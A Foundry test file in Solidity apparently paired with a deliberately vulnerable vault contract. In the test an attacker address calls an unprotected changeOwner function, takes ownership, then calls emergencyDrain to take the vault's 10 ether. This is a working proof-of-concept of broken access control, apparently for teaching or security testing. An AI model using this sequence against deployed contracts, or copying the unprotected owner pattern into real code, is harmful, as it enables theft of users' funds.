// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/AccessControlVulnerability.sol";

contract AccessControlTest is Test {
    AccessControlVulnerability public vault;
    address public owner = address(1);
    address public attacker = address(2);

    function setUp() public {
        vm.prank(owner);
        vault = new AccessControlVulnerability();
        vm.deal(address(vault), 10 ether); // Seed vault with funds
    }

    function test_exploit_unprotected_owner_change() public {
        // Switch context to the attacker
        vm.startPrank(attacker);

        // Exploit the weak access control function
        vault.changeOwner(attacker);

        // Confirm the attacker is now the owner
        assertEq(vault.owner(), attacker);

        // Execute the unauthorized drain
        vault.emergencyDrain();
        vm.stopPrank();

        // Verify the vault was successfully compromised
        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, 10 ether);
    }
}